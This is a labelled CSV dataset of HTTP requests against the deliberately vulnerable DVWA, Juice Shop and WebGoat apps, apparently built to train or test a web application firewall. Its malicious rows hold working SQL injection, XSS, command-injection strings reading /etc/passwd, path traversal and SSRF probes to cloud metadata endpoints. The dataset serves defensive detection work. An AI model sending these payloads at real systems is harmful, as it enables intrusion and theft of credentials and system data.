timestamp,app,method,url,path,query,post_data,label
2026-03-10T04:24:34.106611,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:03.147860+00:00,dvwa,GET,http://localhost:8081/proxy?dest=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,/proxy,dest=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,,malicious
2026-04-20T15:00:03.431860+00:00,dvwa,GET,http://localhost:8081/dvwa/images/login_logo.png?name=%27+OR+%271%27%3D%271%27+--+,/dvwa/images/login_logo.png,name=%27+OR+%271%27%3D%271%27+--+,,malicious
2026-03-10T04:55:24.916938,juiceshop,GET,http://localhost:3000/rest/admin/application-configuration,/rest/admin/application-configuration,,,benign
2026-04-20T15:00:02.249860+00:00,juiceshop,GET,http://localhost:3000/proxy?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,/proxy,url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,,malicious
2026-04-20T15:00:00.065860+00:00,webgoat,POST,http://localhost:8082/login,/login,,url=1+OR+1%3D1--,malicious
2026-03-10T04:53:19.175391,webgoat,GET,http://localhost:8082/WebGoat/css/font-awesome.min.css,/css/font-awesome.min.css,,,benign
2026-03-10T05:00:31.810303,dvwa,GET,http://localhost:8081/dvwa/images/lock.png,/dvwa/images/lock.png,,,benign
2026-04-20T15:00:01.372860+00:00,webgoat,POST,http://localhost:8082/api/review,/api/review,,url=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,malicious
2026-04-20T15:00:00.367860+00:00,webgoat,GET,http://localhost:8082/lessons/SSRF?ip=127.0.0.1%3B+sleep+5,/lessons/SSRF,ip=127.0.0.1%3B+sleep+5,,malicious
2026-04-20T15:00:01.081860+00:00,webgoat,GET,http://localhost:8082/proxy?target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,/proxy,target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,,malicious
2026-03-10T05:11:41.214981,webgoat,GET,http://localhost:8082/WebGoat/js/libs/jquery-ui.min.js,/js/libs/jquery-ui.min.js,,,benign
2026-04-20T15:00:00.892860+00:00,dvwa,GET,http://localhost:8081/about.php?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,/about.php,name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,malicious
2026-04-20T15:00:03.545860+00:00,dvwa,GET,http://localhost:8081/security.php?url=file%3A%2F%2F%2Fetc%2Fpasswd,/security.php,url=file%3A%2F%2F%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:01.516860+00:00,dvwa,POST,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,email=%27+OR+%271%27%3D%271%27+--+,malicious
2026-04-20T15:00:04.809860+00:00,dvwa,GET,http://localhost:8081/view?path=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,/view,path=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:01.170860+00:00,webgoat,GET,http://localhost:8082/https://www.youtube.com/s/embeds/f41f64c3/www-embed-player-es6.vflset/www-embed-player-es6.js?host=localhost%3B+uname+-a,/https://www.youtube.com/s/embeds/f41f64c3/www-embed-player-es6.vflset/www-embed-player-es6.js,host=localhost%3B+uname+-a,,malicious
2026-04-20T15:00:00.514860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/view/GoatRouter.js?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd,/js/goatApp/view/GoatRouter.js,file=..%2F..%2F..%2F..%2Fetc%2Fpasswd,,malicious
2026-03-10T04:47:40.183012,webgoat,GET,https://www.youtube.com/s/player/44899b31/player_es6.vflset/en_GB/embed.js,https://www.youtube.com/s/player/44899b31/player_es6.vflset/en_GB/embed.js,,,benign
2026-04-20T15:00:02.395860+00:00,webgoat,GET,http://localhost:8082/login?name=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/login,name=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-04-20T15:00:03.485860+00:00,juiceshop,GET,http://localhost:3000/socket.io/?ip=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/socket.io/,ip=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:04.321860+00:00,juiceshop,GET,http://localhost:3000/http://cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.js?name=%27+OR+%271%27%3D%271%27+--+,/http://cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.js,name=%27+OR+%271%27%3D%271%27+--+,,malicious
2026-04-20T15:00:00.301860+00:00,dvwa,GET,http://localhost:8081/vulnerabilities/sqli/?endpoint=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,/vulnerabilities/sqli/,endpoint=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,,malicious
2026-03-10T04:55:24.916938,juiceshop,GET,http://localhost:3000/rest/user/whoami,/rest/user/whoami,,,benign
2026-04-20T15:00:01.502860+00:00,juiceshop,GET,http://localhost:3000/assets/public/images/products/raspberry_juice.jpg?host=127.0.0.1+%26%26+whoami,/assets/public/images/products/raspberry_juice.jpg,host=127.0.0.1+%26%26+whoami,,malicious
2026-04-20T15:00:02.986860+00:00,webgoat,POST,http://localhost:8082/comment,/comment,,url=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,malicious
2026-04-20T15:00:01.702860+00:00,juiceshop,GET,http://localhost:3000/api/Challenges/?file=1+OR+1%3D1--,/api/Challenges/,file=1+OR+1%3D1--,,malicious
2026-03-10T05:04:11.070148,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:04.820860+00:00,dvwa,GET,http://localhost:8081/proxy?url=http%3A%2F%2F127.0.0.1%3A22,/proxy,url=http%3A%2F%2F127.0.0.1%3A22,,malicious
2026-03-10T05:01:19.835703,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T05:06:40.303108,juiceshop,GET,http://localhost:3000/api/Products/38,/api/Products/38,,,benign
2026-03-10T04:57:58.975309,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=CIA&index=5,/service/hint.mvc,lessonName=CIA&index=5,,benign
2026-03-10T04:52:32.103163,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=HttpBasics&index=1,/service/hint.mvc,lessonName=HttpBasics&index=1,,benign
2026-04-20T15:00:03.594860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/support/GoatUtils.js?url=file%3A%2F%2F%2Fetc%2Fpasswd,/js/goatApp/support/GoatUtils.js,url=file%3A%2F%2F%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:03.061860+00:00,dvwa,GET,http://localhost:8081/fetch?target=file%3A%2F%2F%2Fetc%2Fpasswd,/fetch,target=file%3A%2F%2F%2Fetc%2Fpasswd,,malicious
2026-03-10T04:21:56.846010,juiceshop,GET,http://localhost:3000/api/Challenges/?name=Score%20Board,/api/Challenges/,name=Score%20Board,,benign
2026-04-20T15:00:00.967860+00:00,webgoat,POST,http://localhost:8082/js/goatApp/view/PaginationControlView.js,/js/goatApp/view/PaginationControlView.js,,token=%27+OR+%271%27%3D%271%27+--+,malicious
2026-04-20T15:00:03.930860+00:00,webgoat,GET,http://localhost:8082/proxy?endpoint=http%3A%2F%2F127.0.0.1%3A22,/proxy,endpoint=http%3A%2F%2F127.0.0.1%3A22,,malicious
2026-04-20T15:00:00.628860+00:00,dvwa,GET,http://localhost:8081/vulnerabilities/brute/?host=%27+OR+SLEEP%285%29--,/vulnerabilities/brute/,host=%27+OR+SLEEP%285%29--,,malicious
2026-03-10T05:01:45.659242,juiceshop,GET,http://localhost:3000/api/Products?sort=name&order=ASC&limit=6,/api/Products,sort=name&order=ASC&limit=6,,benign
2026-03-10T05:06:04.446874,juiceshop,GET,http://localhost:3000/assets/public/images/products/lemon_juice.jpg,/assets/public/images/products/lemon_juice.jpg,,,benign
2026-03-10T04:51:47.313253,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/MenuView.js,/js/goatApp/view/MenuView.js,,,benign
2026-03-10T04:48:05.172688,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=GeneralHeader&index=3,/service/hint.mvc,lessonName=GeneralHeader&index=3,,benign
2026-03-10T05:05:59.722189,juiceshop,POST,http://localhost:3000/api/Users/,/api/Users/,,"{""email"":""user_6a0cf7f5@waf-test.com"",""password"":""Test@12345!"",""passwordRepeat"":""Test@12345!"",""securityQuestion"":{""id"":1,""question"":""Your eldest siblings middle name?"",""createdAt"":""2026-03-10T04:03:05.064Z"",""updatedAt"":""2026-03-10T04:03:05.064Z""},""securityAnswer"":""waftest""}",benign
2026-03-10T04:43:53.479214,dvwa,GET,http://localhost:8081/vulnerabilities/sqli/,/vulnerabilities/sqli/,,,benign
2026-03-10T04:24:30.731022,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T04:52:06.897185,webgoat,GET,http://localhost:8082/WebGoat/lesson_js/jwt-kid.js,/lesson_js/jwt-kid.js,,,benign
2026-03-10T05:02:49.886583,webgoat,GET,https://googleads.g.doubleclick.net/pagead/id?slf_rd=1,https://googleads.g.doubleclick.net/pagead/id,slf_rd=1,,benign
2026-04-20T15:00:01.542860+00:00,webgoat,GET,http://localhost:8082/css/main.css?dest=http%3A%2F%2F127.0.0.1%3A22,/css/main.css,dest=http%3A%2F%2F127.0.0.1%3A22,,malicious
2026-04-20T15:00:00.682860+00:00,juiceshop,POST,http://localhost:3000/api/login,/api/login,,email=%27+OR+SLEEP%285%29--,malicious
2026-04-20T15:00:02.730860+00:00,juiceshop,POST,http://localhost:3000/api/review,/api/review,,message=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,malicious
2026-04-20T15:00:00.880860+00:00,webgoat,POST,http://localhost:8082/api/login,/api/login,,message=%27+UNION+SELECT+1%2C2%2C3--,malicious
2026-03-10T04:49:31.131488,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:01.857860+00:00,dvwa,POST,http://localhost:8081/vulnerabilities/xss_r/,/vulnerabilities/xss_r/,,comment=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,malicious
2026-04-20T15:00:04.722860+00:00,juiceshop,GET,http://localhost:3000/rest/user/whoami?host=%27+OR+SLEEP%285%29--,/rest/user/whoami,host=%27+OR+SLEEP%285%29--,,malicious
2026-04-20T15:00:03.460860+00:00,juiceshop,GET,http://localhost:3000/rest/admin/application-version?name=%27+OR+SLEEP%285%29--,/rest/admin/application-version,name=%27+OR+SLEEP%285%29--,,malicious
2026-03-10T05:01:30.963371,juiceshop,GET,http://localhost:3000/rest/languages,/rest/languages,,,benign
2026-04-20T15:00:04.576860+00:00,dvwa,POST,http://localhost:8081/feedback,/feedback,,username=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,malicious
2026-04-20T15:00:02.037860+00:00,juiceshop,GET,http://localhost:3000/assets/public/images/products/fruit_press.jpg?user=%27+OR+SLEEP%285%29--,/assets/public/images/products/fruit_press.jpg,user=%27+OR+SLEEP%285%29--,,malicious
2026-03-10T05:00:46.315276,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T05:08:54.466101,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:02.521860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/controller/MenuController.js?ip=8.8.8.8+%7C+id,/js/goatApp/controller/MenuController.js,ip=8.8.8.8+%7C+id,,malicious
2026-03-10T05:06:04.445873,juiceshop,GET,http://localhost:3000/assets/public/images/products/carrot_juice.jpeg,/assets/public/images/products/carrot_juice.jpeg,,,benign
2026-03-10T04:56:38.363055,juiceshop,GET,http://localhost:3000/api/Products/25,/api/Products/25,,,benign
2026-03-10T04:18:06.002053,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-03-10T04:57:04.525285,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/model/LessonContentModel.js,/js/goatApp/model/LessonContentModel.js,,,benign
2026-03-10T04:43:55.480078,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T04:24:57.230312,juiceshop,GET,http://localhost:3000/rest/basket/8,/rest/basket/8,,,benign
2026-04-20T15:00:03.568860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js?search=1+OR+1%3D1--,/dvwa/js/add_event_listeners.js,search=1+OR+1%3D1--,,malicious
2026-04-20T15:00:00.634860+00:00,juiceshop,GET,http://localhost:3000/assets/public/favicon_js.ico?url=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,/assets/public/favicon_js.ico,url=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,malicious
2026-04-20T15:00:00.206860+00:00,webgoat,GET,http://localhost:8082/service/hint.mvc?host=%3Cbody+onload%3Dalert%28document.domain%29%3E,/service/hint.mvc,host=%3Cbody+onload%3Dalert%28document.domain%29%3E,,malicious
2026-04-20T15:00:02.616860+00:00,dvwa,GET,http://localhost:8081/dvwa/css/main.css?name=%27+OR+%271%27%3D%271%27+--+,/dvwa/css/main.css,name=%27+OR+%271%27%3D%271%27+--+,,malicious
2026-03-10T04:57:29.571830,webgoat,GET,http://localhost:8082/WebGoat/service/lessonoverview.mvc/SSRF,/service/lessonoverview.mvc/SSRF,,,benign
2026-04-20T15:00:04.672860+00:00,webgoat,GET,http://localhost:8082/js/libs/underscore-min.js?endpoint=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,/js/libs/underscore-min.js,endpoint=gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING,,malicious
2026-03-10T04:24:37.083987,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:01.332860+00:00,webgoat,GET,http://localhost:8082/service/hint.mvc?user=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,/service/hint.mvc,user=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,malicious
2026-03-10T05:06:17.496547,juiceshop,GET,http://localhost:3000/assets/public/favicon_js.ico,/assets/public/favicon_js.ico,,,benign
2026-04-20T15:00:01.477860+00:00,webgoat,GET,http://localhost:8082/service/lessonmenu.mvc?url=1+OR+1%3D1--,/service/lessonmenu.mvc,url=1+OR+1%3D1--,,malicious
2026-04-20T15:00:04.370860+00:00,webgoat,GET,http://localhost:8082/js/libs/bootstrap.min.js?name=admin%27+--,/js/libs/bootstrap.min.js,name=admin%27+--,,malicious
2026-03-10T05:11:41.242971,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/TitleView.js,/js/goatApp/view/TitleView.js,,,benign
2026-04-20T15:00:04.841860+00:00,webgoat,GET,http://localhost:8082/images/xxe-suggested-fix.png?host=%27+OR+%271%27%3D%271%27+--+,/images/xxe-suggested-fix.png,host=%27+OR+%271%27%3D%271%27+--+,,malicious
2026-03-10T05:04:40.767731,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-04-20T15:00:00.418860+00:00,webgoat,GET,http://localhost:8082/service/hint.mvc?target=localhost%3B+uname+-a,/service/hint.mvc,target=localhost%3B+uname+-a,,malicious
2026-04-20T15:00:03.000860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js?file=1%27+AND+%271%27%3D%271,/dvwa/js/dvwaPage.js,file=1%27+AND+%271%27%3D%271,,malicious
2026-03-10T04:24:44.090594,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:04.150860+00:00,webgoat,GET,http://localhost:8082/service/hint.mvc?host=%27+UNION+SELECT+1%2C2%2C3--,/service/hint.mvc,host=%27+UNION+SELECT+1%2C2%2C3--,,malicious
2026-04-20T15:00:04.272860+00:00,dvwa,GET,http://localhost:8081/vulnerabilities/csrf/?url=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,/vulnerabilities/csrf/,url=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,malicious
2026-04-20T15:00:02.546860+00:00,dvwa,GET,http://localhost:8081/dvwa/css/main.css?page=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,/dvwa/css/main.css,page=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,malicious
2026-03-10T05:04:46.375883,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-03-10T04:47:12.185500,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/ErrorNotificationView.js,/js/goatApp/view/ErrorNotificationView.js,,,benign
2026-04-20T15:00:01.646860+00:00,webgoat,GET,http://localhost:8082/export?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd,/export,path=..%2F..%2F..%2F..%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:02.829860+00:00,juiceshop,GET,http://localhost:3000/rest/admin/application-version?host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/rest/admin/application-version,host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:03.584860+00:00,dvwa,GET,http://localhost:8081/export?page=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,/export,page=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,,malicious
2026-03-10T05:09:07.653536,dvwa,GET,http://localhost:8081/vulnerabilities/sqli_blind/?id=2&Submit=Submit,/vulnerabilities/sqli_blind/,id=2&Submit=Submit,,benign
2026-04-20T15:00:03.468860+00:00,webgoat,GET,http://localhost:8082/export?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd,/export,page=..%2F..%2F..%2F..%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:02.722860+00:00,juiceshop,GET,http://localhost:3000/proxy?url=http%3A%2F%2Flocalhost%2Fadmin,/proxy,url=http%3A%2F%2Flocalhost%2Fadmin,,malicious
2026-04-20T15:00:01.133860+00:00,dvwa,GET,http://localhost:8081/dvwa/css/main.css?host=8.8.8.8+%7C+id,/dvwa/css/main.css,host=8.8.8.8+%7C+id,,malicious
2026-03-10T04:56:58.038242,juiceshop,GET,http://localhost:3000/rest/products/search?q=,/rest/products/search,q=,,benign
2026-03-10T05:00:43.190397,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:02.384860+00:00,webgoat,POST,http://localhost:8082/api/review,/api/review,,email=%3Cbody+onload%3Dalert%28document.domain%29%3E,malicious
2026-04-20T15:00:01.907860+00:00,webgoat,GET,http://localhost:8082/css/animate.css?name=%27+OR+SLEEP%285%29--,/css/animate.css,name=%27+OR+SLEEP%285%29--,,malicious
2026-04-20T15:00:00.913860+00:00,juiceshop,POST,http://localhost:3000/main.js,/main.js,,token=%3Cbody+onload%3Dalert%28document.domain%29%3E,malicious
2026-04-20T15:00:00.305860+00:00,webgoat,POST,http://localhost:8082/submit,/submit,,token=%27+OR+SLEEP%285%29--,malicious
2026-04-20T15:00:04.886860+00:00,juiceshop,GET,http://localhost:3000/https://cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.css?page=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,/https://cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.css,page=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd,,malicious
2026-04-20T15:00:03.187860+00:00,juiceshop,GET,http://localhost:3000/rest/products/24/reviews?page=%3Csvg%2Fonload%3Dalert%281%29%3E,/rest/products/24/reviews,page=%3Csvg%2Fonload%3Dalert%281%29%3E,,malicious
2026-03-10T04:47:32.082997,webgoat,GET,http://localhost:8082/WebGoat/js/quiz.js,/js/quiz.js,,,benign
2026-04-20T15:00:00.130860+00:00,webgoat,GET,http://localhost:8082/webhook/test?url=http%3A%2F%2F127.0.0.1%3A22,/webhook/test,url=http%3A%2F%2F127.0.0.1%3A22,,malicious
2026-04-20T15:00:04.118860+00:00,webgoat,POST,http://localhost:8082/login,/login,,url=%27+OR+SLEEP%285%29--,malicious
2026-04-20T15:00:01.560860+00:00,juiceshop,POST,http://localhost:3000/login,/login,,username=%27+OR+SLEEP%285%29--,malicious
2026-04-20T15:00:00.374860+00:00,webgoat,POST,http://localhost:8082/submit,/submit,,username=1%27+AND+%271%27%3D%271,malicious
2026-03-10T04:21:47.658474,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T05:01:01.066001,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-04-20T15:00:04.818860+00:00,dvwa,GET,http://localhost:8081/dvwa/css/main.css?search=1%27+AND+%271%27%3D%271,/dvwa/css/main.css,search=1%27+AND+%271%27%3D%271,,malicious
2026-03-10T05:10:40.318930,juiceshop,GET,http://localhost:3000/assets/public/images/products/permafrost.jpg,/assets/public/images/products/permafrost.jpg,,,benign
2026-04-20T15:00:03.081860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js?path=..%252f..%252f..%252f..%252fetc%252fpasswd,/dvwa/js/dvwaPage.js,path=..%252f..%252f..%252f..%252fetc%252fpasswd,,malicious
2026-03-10T05:08:55.366857,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-04-20T15:00:03.579860+00:00,dvwa,POST,http://localhost:8081/comment,/comment,,token=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,malicious
2026-04-20T15:00:01.076860+00:00,webgoat,GET,http://localhost:8082/images/xxe-suggested-fix.png?q=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,/images/xxe-suggested-fix.png,q=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,,malicious
2026-03-10T05:12:43.295383,webgoat,GET,http://localhost:8082/WebGoat/service/hint.mvc?lessonName=XSS&index=3,/service/hint.mvc,lessonName=XSS&index=3,,benign
2026-04-20T15:00:04.251860+00:00,webgoat,GET,http://localhost:8082/css/main.css?url=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,/css/main.css,url=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,malicious
2026-04-20T15:00:04.797860+00:00,dvwa,GET,http://localhost:8081/dvwa/css/main.css?q=admin%27+--,/dvwa/css/main.css,q=admin%27+--,,malicious
2026-04-20T15:00:01.978860+00:00,juiceshop,POST,http://localhost:3000/feedback,/feedback,,message=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E,malicious
2026-04-20T15:00:04.603860+00:00,dvwa,GET,http://localhost:8081/vulnerabilities/exec/?ip=localhost%3B+uname+-a,/vulnerabilities/exec/,ip=localhost%3B+uname+-a,,malicious
2026-03-10T04:52:06.980547,webgoat,GET,http://localhost:8082/WebGoat/images/wolf-enabled.png,/images/wolf-enabled.png,,,benign
2026-03-10T05:09:00.041362,dvwa,GET,http://localhost:8081/dvwa/css/main.css,/dvwa/css/main.css,,,benign
2026-03-10T05:04:27.702890,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T04:50:31.789331,dvwa,GET,http://localhost:8081/login.php,/login.php,,,benign
2026-03-10T04:22:35.342461,juiceshop,GET,http://cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.js,http://cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.js,,,benign
2026-03-10T05:08:41.289792,dvwa,GET,http://localhost:8081/dvwa/js/add_event_listeners.js,/dvwa/js/add_event_listeners.js,,,benign
2026-04-20T15:00:02.928860+00:00,webgoat,GET,http://localhost:8082/js/goatApp/support/goatAsyncErrorHandler.js?host=127.0.0.1%3B+sleep+5,/js/goatApp/support/goatAsyncErrorHandler.js,host=127.0.0.1%3B+sleep+5,,malicious
2026-04-20T15:00:04.164860+00:00,juiceshop,GET,http://localhost:3000/api/Users/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,/api/Users/,search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,malicious
2026-03-10T04:50:33.135369,juiceshop,GET,http://localhost:3000/socket.io/?EIO=4&transport=polling&t=PpM5Hcw,/socket.io/,EIO=4&transport=polling&t=PpM5Hcw,,benign
2026-03-10T04:46:13.248304,juiceshop,GET,http://localhost:3000/rest/products/33/reviews,/rest/products/33/reviews,,,benign
2026-04-20T15:00:03.900860+00:00,webgoat,GET,http://localhost:8082/service/hint.mvc?q=%3Csvg%2Fonload%3Dalert%281%29%3E,/service/hint.mvc,q=%3Csvg%2Fonload%3Dalert%281%29%3E,,malicious
2026-03-10T04:47:19.513755,webgoat,GET,http://localhost:8082/WebGoat/images/zap_edit_and_send.png,/images/zap_edit_and_send.png,,,benign
2026-04-20T15:00:04.400860+00:00,webgoat,GET,http://localhost:8082/service/lessonmenu.mvc?q=1%27+AND+%271%27%3D%271,/service/lessonmenu.mvc,q=1%27+AND+%271%27%3D%271,,malicious
2026-04-20T15:00:01.630860+00:00,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js?cmd=127.0.0.1+%26%26+whoami,/dvwa/js/dvwaPage.js,cmd=127.0.0.1+%26%26+whoami,,malicious
2026-04-20T15:00:02.109860+00:00,webgoat,GET,http://localhost:8082/service/lessonoverview.mvc/HttpProxies?host=admin%27+--,/service/lessonoverview.mvc/HttpProxies,host=admin%27+--,,malicious
2026-04-20T15:00:02.328860+00:00,webgoat,GET,http://localhost:8082/login?url=1+OR+1%3D1--,/login,url=1+OR+1%3D1--,,malicious
2026-04-20T15:00:01.604860+00:00,webgoat,POST,http://localhost:8082/comment,/comment,,token=%3Cbody+onload%3Dalert%28document.domain%29%3E,malicious
2026-04-20T15:00:02.375860+00:00,webgoat,GET,http://localhost:8082/images/chrome-manual-proxy.png?user=%3Cbody+onload%3Dalert%28document.domain%29%3E,/images/chrome-manual-proxy.png,user=%3Cbody+onload%3Dalert%28document.domain%29%3E,,malicious
2026-04-20T15:00:01.950860+00:00,dvwa,GET,http://localhost:8081/view?path=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,/view,path=..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron,,malicious
2026-03-10T05:02:33.110116,webgoat,GET,http://localhost:8082/WebGoat/js/goatApp/view/LessonContentView.js,/js/goatApp/view/LessonContentView.js,,,benign
2026-03-10T04:48:56.946384,dvwa,GET,http://localhost:8081/vulnerabilities/brute/,/vulnerabilities/brute/,,,benign
2026-03-10T04:22:57.929100,webgoat,GET,http://localhost:8082/WebGoat/css/img/nllang.svg,/css/img/nllang.svg,,,benign
2026-03-10T04:18:33.930925,dvwa,GET,http://localhost:8081/dvwa/images/logo.png,/dvwa/images/logo.png,,,benign
2026-03-10T04:53:48.096321,dvwa,GET,http://localhost:8081/dvwa/js/dvwaPage.js,/dvwa/js/dvwaPage.js,,,benign
2026-04-20T15:00:00.874860+00:00,juiceshop,GET,http://localhost:3000/assets/public/images/products/apple_pressings.jpg?host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,/assets/public/images/products/apple_pressings.jpg,host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd,,malicious
